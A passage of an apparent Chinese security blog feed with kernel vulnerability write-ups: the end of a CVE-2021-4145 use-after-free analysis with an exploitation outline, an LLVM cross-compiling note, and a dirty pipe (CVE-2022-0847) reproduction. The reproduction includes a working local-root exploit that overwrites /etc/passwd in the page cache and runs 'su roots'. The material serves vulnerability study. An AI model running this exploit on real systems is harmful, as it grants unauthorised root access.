class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">return</span> invalfc(fc, <span class="string">&quot;Invalid name&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* Specifying two names is forbidden */</span></span><br><span class="line">            <span class="keyword">if</span> (ctx-&gt;name)</span><br><span class="line">                <span class="keyword">return</span> invalfc(fc, <span class="string">&quot;name respecified&quot;</span>);</span><br><span class="line">            ctx-&gt;name = param-&gt;<span class="built_in">string</span>;</span><br><span class="line">            param-&gt;<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 <code>PATCH</code> 文件可以看出来（实则因为菜实在分析不来）</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/kernel/cgroup/cgroup-v1.c b/kernel/cgroup/cgroup-v1.c</span></span><br><span class="line"><span class="comment">index ee93b6e895874..527917c0b30be 100644</span></span><br><span class="line"><span class="comment">--- a/kernel/cgroup/cgroup-v1.c</span></span><br><span class="line"><span class="comment">+++ b/kernel/cgroup/cgroup-v1.c</span></span><br><span class="line"><span class="meta">@@ -912,6 +912,8 @@</span> int cgroup1_parse_param(struct fs_context *fc, struct fs_parameter *param)</span><br><span class="line"> opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);</span><br><span class="line"> if (opt == -ENOPARAM) &#123;</span><br><span class="line"> if (strcmp(param-&gt;key, &quot;source&quot;) == 0) &#123;</span><br><span class="line"><span class="addition">+if (param-&gt;type != fs_value_is_string)</span></span><br><span class="line"><span class="addition">+return invalf(fc, &quot;Non-string source&quot;);</span></span><br><span class="line"> if (fc-&gt;source)</span><br><span class="line"> return invalf(fc, &quot;Multiple sources not supported&quot;);</span><br><span class="line"> fc-&gt;source = param-&gt;string;</span><br></pre></td></tr></table></figure><p>如果 <code>key</code> 为 <code>source</code>，那么 <code>param-&gt;type</code> 必须被指定为 <code>string</code> 类型而不能是文件描述符，此时因为外面的 <code>cmd=FSCONFIG_SET_FD</code>，因此获取了文件结构在联合体当中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_parameter</span> &#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>*key;<span class="comment">/* Parameter name */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">fs_value_type</span><span class="title">type</span>:</span><span class="number">8</span>;<span class="comment">/* The type of value here */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">char</span>*<span class="built_in">string</span>;</span><br><span class="line">        <span class="type">void</span>*blob;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">filename</span>*<span class="title">name</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">file</span>*<span class="title">file</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">size_t</span>size;</span><br><span class="line">    <span class="type">int</span>dirfd;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在判断中可以看到这样一句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(param-&gt;key, <span class="string">&quot;source&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fc-&gt;source)</span><br><span class="line">        <span class="keyword">return</span> invalf(fc, <span class="string">&quot;Multiple sources not supported&quot;</span>);</span><br><span class="line">    fc-&gt;source = param-&gt;<span class="built_in">string</span>;</span><br><span class="line">    param-&gt;<span class="built_in">string</span> = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时将 <code>string</code> 保存在 <code>fc-&gt;source</code> 当中，因为它们共用内存，所以这里的 <code>string</code> 实际上是 <code>struct file</code> 结构体指针。</p><p>最后要 <code>free</code> 掉这个 <code>fs_context</code> 结构时，就意外地造成了这里的文件结构的 <code>uaf</code>，最后这个系统调用完成会触发 <code>fscontext_release</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">put_fs_context</span><span class="params">(<span class="keyword">struct</span> fs_context *fc)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fc-&gt;root) &#123;</span><br><span class="line">        sb = fc-&gt;root-&gt;d_sb;</span><br><span class="line">        dput(fc-&gt;root);</span><br><span class="line">        fc-&gt;root = <span class="literal">NULL</span>;</span><br><span class="line">        deactivate_super(sb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fc-&gt;need_free &amp;&amp; fc-&gt;ops &amp;&amp; fc-&gt;ops-&gt;<span class="built_in">free</span>)</span><br><span class="line">        fc-&gt;ops-&gt;<span class="built_in">free</span>(fc);</span><br><span class="line"></span><br><span class="line">    security_free_mnt_opts(&amp;fc-&gt;security);</span><br><span class="line">    put_net(fc-&gt;net_ns);</span><br><span class="line">    put_user_ns(fc-&gt;user_ns);</span><br><span class="line">    put_cred(fc-&gt;cred);</span><br><span class="line">    put_fc_log(fc);</span><br><span class="line">    put_filesystem(fc-&gt;fs_type);</span><br><span class="line">    kfree(fc-&gt;source);<span class="comment">//这里意外地 free 掉了文件结构</span></span><br><span class="line">    kfree(fc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">fscontext_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span> =</span> file-&gt;private_data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fc) &#123;</span><br><span class="line">        file-&gt;private_data = <span class="literal">NULL</span>;</span><br><span class="line">        put_fs_context(fc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h2><h3 id="触发UAF"><a href="#触发UAF" class="headerlink" title="触发UAF"></a>触发UAF</h3><p>第一步打断点 <code>__do_sys_fsconfig</code>，然后跟到图示这个位置，可以发现获取到了文件结构了。</p><img src="/2024/03/13/CVE-2021-4145/3.png" class=""><p>随后跟到这个位置</p><img src="/2024/03/13/CVE-2021-4145/4.png" class=""><p>这里会有调用刚刚的 <code>cgroup1_parse_param</code>，当然也可以直接下断点 <code>continue</code> 过去。</p><img src="/2024/03/13/CVE-2021-4145/5.png" class=""><p>当然这里可以看到 <code>source</code> 直接被取走了，保存到了 <code>fc</code> 结构当中。</p><p>随后下断在 <code>fscontext_release</code>，然后 <code>continue</code> 过去，走到 <code>kfree</code> 这和位置可以发现 <code>source</code> 被释放。</p><img src="/2024/03/13/CVE-2021-4145/6.png" class=""><p>这里也能看到作者原意是想在这里释放 <code>source</code> 字符串，但是这里释放了 <code>file</code> 文件结构指针，调试的时候可以和之前对一下，发现地址是一致的，因此这里造成了 uaf。</p><h3 id="延长竞争时间"><a href="#延长竞争时间" class="headerlink" title="延长竞争时间"></a>延长竞争时间</h3><p>这里采用 <code>writev</code> 写入大量数据使得文件拿锁的时间加长。为了调试 <code>exp</code>，可以用 <code>add-symbol-file</code> 命令去添加符号，这里可以选择断 <code>write_cmd</code> 的 <code>writev</code> 函数，因为这里会因为写入数据量过大而长期持有锁，writev 就会尝试持续获得锁。</p><img src="/2024/03/13/CVE-2021-4145/7.png" class=""><p>随后经过系统调用来到 <code>do_writev</code> 函数</p><img src="/2024/03/13/CVE-2021-4145/8.png" class=""><p>不过这里多线程比较难调，也不放调试具体过程了，感觉原理还是比较浅显易懂的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们可以总结出以下的利用思路：</p><ul><li><code>fsconfig</code> 系统调用的代码存在类型混淆漏洞，间接导致了可以使得某文件描述符结构被 <code>uaf</code></li><li>通过写入大量数据延长竞争时间，通过建立一个链接的方式绕过 <code>open</code> 时赋予的标记位，使得两个线程可以卡在权限校验之后。</li><li>第三个线程在第二个线程卡住的时间申请 <code>/etc/passwd</code> 文件的结构，替换线程 2 正在写入的文件，完成漏洞利用。</li></ul><p>分析的还有很多不足之处，如果有讲的不好的地方恳请师傅多多包涵并帮助指正。</p>]]></content>
    
    
    <summary type="html">复现一下 dirty cred 漏洞</summary>
    
    
    
    <category term="Linux" scheme="https://xia0ji233.github.io/categories/Linux/"/>
    
    <category term="CVE" scheme="https://xia0ji233.github.io/categories/Linux/CVE/"/>
    
    <category term="2021-4145" scheme="https://xia0ji233.github.io/categories/Linux/CVE/2021-4145/"/>
    
    
  </entry>
  
  <entry>
    <title>LLVM——交叉编译的配置</title>
    <link href="https://xia0ji233.github.io/2024/03/04/LLVM5/"/>
    <id>https://xia0ji233.github.io/2024/03/04/LLVM5/</id>
    <published>2024-03-04T12:00:00.000Z</published>
    <updated>2024-04-09T05:23:09.875Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下LLVM交叉编译踩的坑</p><span id="more"></span><h2 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h2><p>关于这个概念其实很简单，生成其它平台上的可执行文件的编译过程就叫交叉编译。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>第一步先实现最简单的跨平台交叉编译，我使用Windows版本的LLVM，尝试编译 Linux 平台的 ELF 文件。首先交叉编译要进行一定的环境配置，配置 include path 和库的目录。因为交叉编译需要用到一些 gcc 的库，所以自己编译 glibc 然后复制 include path 和 lib path 到自己的机器是没用的。</p><p>这里我选择直接使用一台自己装过 gcc 开发环境的机器，将 <code>/usr/include</code> 目录的文件拷贝过来，这里我拷贝到 <code>D:\Linux\include</code> 下，再将 gcc 的库拷贝到 <code>D:\Linux\lib\</code> 目录下。这里还有一个坑就是启动文件也需要指定，启动文件在 gcc 里面都有。</p><p>最后编译的命令行为： <code>clang -fuse-ld=lld -g main.cpp -target x86_64-linux-gnu -ID:\Linux\include -L-BD:\Linux\lib\gcc\x86_64-linux-gnu\11 -o main -BD:\Linux\lib\gcc\x86_64-linux-gnu\11</code> 即可。</p><p>但是注意，因为好像这个目录下的 lib 是软链接 <code>/usr/lib/x86_64-linux-gnu</code> 下的库，所以需要用下面的库进行覆盖才可以完成编译。</p><img src="/2024/03/04/LLVM5/1.png" class=""><p>目前看上去效果还不错，特此记录一下，后面做 ARM 平台的交叉编译可以 refer 这次的经历。</p>]]></content>
    
    
    <summary type="html">记录一下LLVM交叉编译踩的坑</summary>
    
    
    
    <category term="Compiler" scheme="https://xia0ji233.github.io/categories/Compiler/"/>
    
    <category term="LLVM" scheme="https://xia0ji233.github.io/categories/Compiler/LLVM/"/>
    
    
    <category term="LLVM" scheme="https://xia0ji233.github.io/tags/LLVM/"/>
    
    <category term="Linux" scheme="https://xia0ji233.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>dirty pipe(CVE-2022-0847)漏洞复现</title>
    <link href="https://xia0ji233.github.io/2024/02/02/CVE-2022-0847/"/>
    <id>https://xia0ji233.github.io/2024/02/02/CVE-2022-0847/</id>
    <published>2024-02-02T13:00:00.000Z</published>
    <updated>2024-04-09T05:23:09.840Z</updated>
    
    <content type="html"><![CDATA[<p>复现一下 dirty pipe漏洞</p><span id="more"></span><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>漏洞发现者 Max Kellermann 并不是专门从事漏洞挖掘工作的，而是在服务器中多次出现了文件错误的问题，用户下载的包含日志的gzip文件多次出现CRC校验位错误, 排查后发现CRC校验位总是被一段ZIP头覆盖。</p><p>根据作者介绍, 可以生成ZIP文件的只有主服务器的一个负责HTTP连接的服务，但是该服务并没有写 gzip 文件的权限。即主服务器同时存在一个 writer 进程与一个 splicer 进程, 两个进程以不同的用户身份运行, splicer进程并没有写入writer 进程目标文件的权限, 但存在 splicer 进程的数据写入文件的 bug 存在。</p><p>有兴趣可以看看漏洞发现者写的<a href="https://dirtypipe.cm4all.com/">原文</a>。作者竟然是从一个小小的软件bug一步一步深挖到了内核漏洞，实在是佩服作者的这种探索精神。</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>这里我按照自己复现准备的一个真实状态来写。</p><p>首先是准备一个被漏洞影响的版本内核，这里我使用了 <code>5.8.0-63-generic</code> 版本。本来之前打算直接 <code>Ubuntu20.04LTS</code> 一了百了，但是发现它内核有自动更新，下过来就是最新的，漏洞已经被修复了。所以这里直接用这个讲讲换这个内核的版本。</p><p>首先 apt 寻找这个版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search linux | grep 5.8.0-63</span><br></pre></td></tr></table></figure><p>然后我们在列表中寻一下</p><img src="/2024/02/02/CVE-2022-0847/1.png" class=""><p>再用 apt 安装这个内核</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install linux-image-5.8.0-63-generic</span><br></pre></td></tr></table></figure><p>安装完成之后， <code>reboot</code> 重启，开机界面按 <code>shift+TAB</code> 进入 ubuntu 引导界面，然后选择高级选项 <code>advance</code>，选择我们刚刚安装的那个内核进入启动。</p><img src="/2024/02/02/CVE-2022-0847/2.png" class=""><p>成功替换指定的版本。</p><h2 id="前置芝士"><a href="#前置芝士" class="headerlink" title="前置芝士"></a>前置芝士</h2><h3 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h3><p>匿名管道，用于作为一个读写数据的通道，参数给一个长度为 2 的 <code>int</code> 数组，并通过这个数组返回，创建成功则返回对应的读写描述符，一端只能用于读，一端只能写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">10</span>];</span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    write(pipe_fd[<span class="number">1</span>],<span class="string">&quot;AAAA&quot;</span>,<span class="number">4</span>);</span><br><span class="line">    read(pipe_fd[<span class="number">0</span>],buffer,<span class="number">4</span>);</span><br><span class="line">    write(<span class="number">1</span>,buffer,<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">AAAA</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="Splice"><a href="#Splice" class="headerlink" title="Splice"></a>Splice</h3><p>splice用于在两个文件描述符之间移动数据， 也是<a href="#ZeroCopy">零拷贝</a>。</p><p>函数原型是 ：</p><p><code>ssize_t splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out, size_t len, unsigned int flags); </code></p><p>参数解释：</p><ul><li><code>fd_in</code>：输入文件描述符</li><li><code>fd_out</code>：输出文件描述符</li><li><code>len</code>：移动字节长度</li><li><code>flags</code>：控制数据如何移动。</li></ul><p>返回值：</p><ul><li><code>&gt;0</code>：表示成功移动的字节数</li><li><code>==0</code>：表示没有字节可以移动</li><li><code>&lt;0</code>：表示出现某些错误</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    write(pipe_fd[<span class="number">1</span>],<span class="string">&quot;AAAA&quot;</span>,<span class="number">4</span>);</span><br><span class="line">    splice(pipe_fd[<span class="number">0</span>],<span class="literal">NULL</span>,<span class="number">1</span>,<span class="literal">NULL</span>,<span class="number">4</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">AAAA</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><hr><h2 id="bug复现"><a href="#bug复现" class="headerlink" title="bug复现"></a>bug复现</h2><p>做完上面两个前置芝士之后，应该能对 pipe 和 splice 稍微有点理解了，那么我们来复现一下 paper 上面说的 bug。把两个服务简化一下写出这两个程序：</p><p>创建一个 <code>tmpfile</code>，<code>user</code> 属主，权限 755。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//server1,user运行的服务，生成可执行文件为 p1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> file[]=<span class="string">&quot;./tmpfile&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> p[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="type">int</span> fd=open(file,O_WRONLY);</span><br><span class="line">    <span class="type">int</span> i=<span class="number">2000</span>;</span><br><span class="line">    <span class="keyword">while</span>(i--)&#123;</span><br><span class="line">        write(fd,<span class="string">&quot;AAAAA&quot;</span>,<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;write over\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面这个是要准备去写之前准备的那个文件了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//server2,hacker运行的服务，生成可执行文件为p2</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> file[]=<span class="string">&quot;./tmpfile&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> p[<span class="number">2</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="type">int</span> fd=open(file,O_RDONLY);</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buffer,<span class="number">0</span>,<span class="number">4096</span>);</span><br><span class="line">    <span class="keyword">if</span>(pipe(p))<span class="built_in">abort</span>();</span><br><span class="line">    <span class="type">int</span> nbytes1,nbytes2;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        nbytes1=splice(fd,<span class="literal">NULL</span>,p[<span class="number">1</span>],<span class="literal">NULL</span>,<span class="number">5</span>,<span class="number">0</span>);</span><br><span class="line">        nbytes2=write(p[<span class="number">1</span>],<span class="string">&quot;BBBBB&quot;</span>,<span class="number">5</span>);</span><br><span class="line">        read(p[<span class="number">0</span>],buffer,<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span>(nbytes1==<span class="number">0</span>||nbytes2==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们这么操作：</p><p>先使用 user 用户创建一个 <code>tmpfile</code>，运行 <code>p1</code> 文件。</p><img src="/2024/02/02/CVE-2022-0847/3.png" class=""><p>在这个文件中我们写了 5000 个 A，并且权限归 user 所有，只有它有写的权限。</p><p>切换回 hacker 用户，运行 p2 文件，我们发现 tmpfile 中间居然出现了 <code>BBBBB</code>。</p><img src="/2024/02/02/CVE-2022-0847/4.png" class=""><p>这就证明了这个漏洞的存在，这个漏洞的危害在于：只要文件可读，那我就可以写，这是非常危险的。</p><p>但是，我们不做任何操作，重启机器之后发现文件又变回了全 A 的状态。这说明，p2程序对tmpfile文件的修改仅存在于系统的页面缓存(page cache)中。</p><p>但是这个页面缓存在内核中，我们打开的文件会短暂停留在 page cache 当中，一段时间内我们打开的文件就相当于这个 page cache 的内容，所以我们更改了 page cache 其实也是可以达到修改文件的目的的。</p><h2 id="exploit以及分析"><a href="#exploit以及分析" class="headerlink" title="exploit以及分析"></a>exploit以及分析</h2><p>这里我根据了我自己对这个漏洞的理解写了一个便于我们获取 root 权限的 exploit。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SIZE PAGE_SIZE*16</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SetCanMerge</span><span class="params">(<span class="type">int</span> fd[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf;</span><br><span class="line">    pipe(fd);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;PIPE_SIZE;i++)&#123;</span><br><span class="line">        write(fd[<span class="number">1</span>],<span class="string">&quot;a&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        read(fd[<span class="number">0</span>],&amp;buf,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> pipefd[<span class="number">2</span>];</span><br><span class="line">    SetCanMerge(pipefd);</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/etc/passwd&quot;</span>,O_RDONLY);</span><br><span class="line">    splice(fd,<span class="literal">NULL</span>,pipefd[<span class="number">1</span>],<span class="literal">NULL</span>,<span class="number">1</span>,<span class="number">0</span>);    </span><br><span class="line">    write(pipefd[<span class="number">1</span>],<span class="string">&quot;oots:&quot;</span>,<span class="number">5</span>);</span><br><span class="line">    system(<span class="string">&quot;su roots&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一步一步分析一下它的 exp。</p><p>首先我用了一个 <code>SetCanMerge</code> 函数去填满 <code>pipe</code>，这一步的作用是走完一遍 <code>pipe</code> 的缓冲区。<code>pipe</code> 的缓冲区是以页为单位的，总共是 16 页的环形缓冲区。这一步就是去设置所有 page 的 <code>Can Merge</code> 属性。这个 <code>Can Merge</code> 标识了这个 <code>pipe</code> 能否被续写。</p><p>我们先来介绍一下续写的概念，续写就是说在我总共 16 页的缓冲区中，我写了一个字符，那么它会被存储在下标为 0 